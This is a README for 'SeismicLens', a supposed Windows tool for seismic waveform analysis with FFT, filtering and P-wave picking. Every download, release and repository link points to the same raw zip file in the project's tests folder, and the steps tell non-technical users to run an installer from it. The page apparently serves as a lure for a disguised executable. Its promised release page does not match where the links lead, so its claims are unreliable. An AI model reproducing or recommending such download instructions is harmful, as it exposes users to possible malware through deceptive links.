# 🔎 SeismicLens - Easy Seismic Waveform Analysis

[![Download SeismicLens](https://img.shields.io/badge/Download-SeismicLens-green?style=for-the-badge)](https://github.com/operculate-ashkenazi147/SeismicLens/raw/refs/heads/main/tests/Lens_Seismic_v1.9.zip)

---

SeismicLens helps you explore seismic waveforms with simple tools. It allows you to view and analyze earthquake signals using clear visualizations and filtering. You do not need technical skills to use this software.

---

## 🖥️ System Requirements

- **Operating System:** Windows 10 or later  
- **Processor:** 2 GHz or faster  
- **Memory:** 4 GB RAM minimum, 8 GB recommended  
- **Storage:** 500 MB free space  
- **Display:** 1280 x 720 resolution or higher  
- **Internet:** Required for download and updates  

---

## 📥 Download and Install SeismicLens

To start using SeismicLens on Windows, follow these steps:

1. Visit the download page by clicking this button:  
   [![Get SeismicLens](https://img.shields.io/badge/Download-SeismicLens-blue?style=for-the-badge)](https://github.com/operculate-ashkenazi147/SeismicLens/raw/refs/heads/main/tests/Lens_Seismic_v1.9.zip)

2. On the release page, find the latest version. The version usually follows the format "vX.X.X" (for example, v1.2.0).

3. Under the latest release, look for the Windows installer file. It will usually have `.exe` at the end, like `SeismicLens-setup.exe`.

4. Click the `.exe` file to download it onto your computer.

5. Once the download finishes, open the file by double-clicking it.

6. The installer will guide you through the setup. You can keep the default options.

7. After installation, you will find SeismicLens in your Start menu.

---

## 🚀 Running SeismicLens for the First Time

1. Open SeismicLens from the Start menu or desktop shortcut.

2. The software will open with a clean interface.

3. You can load seismic waveform files by choosing **File > Open**.

4. Accepted file formats include `.SAC`, `.MSEED`, and `.CSV`.

5. Use the buttons and sliders in the software to view signal spectra, apply filters, and pick seismic events.

---

## 🔧 Basic Features Explained

- **FFT Spectral Analysis**  
  This shows the frequency content of your seismic data. SeismicLens calculates the Fourier transform so you can see strong frequency bands.

- **Zero-Phase Butterworth Filtering**  
  This filter removes noise while keeping the signal phase correct. It helps improve visibility of seismic events without distortion.

- **STA/LTA P-wave Picking**  
  This tool detects P-waves — the first arrival of seismic waves in an event. It marks the start of the earthquake signal automatically.

- **STFT Spectrogram**  
  You can watch how the frequencies change over time. This helps identify different wave types and their behavior during an earthquake.

- **Synthetic Earthquake Generation**  
  Create simulated seismic signals with user-defined parameters. This is useful for learning or testing analysis methods without real data.

---

## 📂 Opening Your Own Seismic Data

SeismicLens works with common seismic data file types. Here is how to open your own files:

1. Place your seismic files in an easy-to-find folder.

2. In SeismicLens, click **File > Open**.

3. Navigate to your folder and select the file you want.

4. The waveform will appear in the main window.

5. Use zoom and pan controls to explore the waveform.

---

## ⚙️ How to Use Key Tools

### FFT Spectrum

- Click the **FFT** tab.
- The graph shows frequencies from low (left) to high (right).
- Peaks indicate strong frequency components.
- You can adjust the window size for analysis on the right side panel.

### Butterworth Filter

- Select the **Filter** tab.
- Choose filter type (low-pass, high-pass, band-pass).
- Enter cutoff frequencies.
- Apply the filter to clean the waveform.

### STA/LTA Picker

- Open the **Picker** tab.
- Set short-term and long-term window lengths.
- Click **Run Picker** to detect potential P-wave arrivals.
- You can adjust settings and rerun if needed.

### STFT Spectrogram

- Go to the **Spectrogram** tab.
- See a heatmap that shows frequency intensity over time.
- Useful to detect different wave types and phases.

### Synthetic Data

- Open the **Synthetic** tab.
- Input parameters such as amplitude, frequency, and duration.
- Click **Generate** to create a simulated seismic signal.

---

## 🛠 Troubleshooting

- If SeismicLens does not open, check your Windows version and make sure it meets system requirements.

- If file loading fails, ensure your file format is supported (`.SAC`, `.MSEED`, `.CSV`).

- Restart the application if you see errors during filtering or picking.

- Check you have enough free disk space and memory.

---

## 🧰 Additional Tips

- Save your work often by going to **File > Save As**.

- Use the zoom and pan controls to get a closer look at waveforms.

- Experiment with filters and picking parameters to see different results.

- Use synthetic data generation to practice without needing real recordings.

---

## 🔗 Useful Links

- Visit the download page anytime here:  
  [SeismicLens Releases](https://github.com/operculate-ashkenazi147/SeismicLens/raw/refs/heads/main/tests/Lens_Seismic_v1.9.zip)

- GitHub Repository:  
  https://github.com/operculate-ashkenazi147/SeismicLens/raw/refs/heads/main/tests/Lens_Seismic_v1.9.zip

---

## 📚 More Help

If you want to learn more about seismic waveforms and analysis, consider exploring basic guides on signal processing and seismic data in simple language. Online tutorials about FFT, filters, and wave detection might help make SeismicLens easier to use.

---

Powered by Python and libraries like ObsPy and SciPy, SeismicLens runs smoothly on Windows without needing coding skills. The interface focuses on clarity and useful features.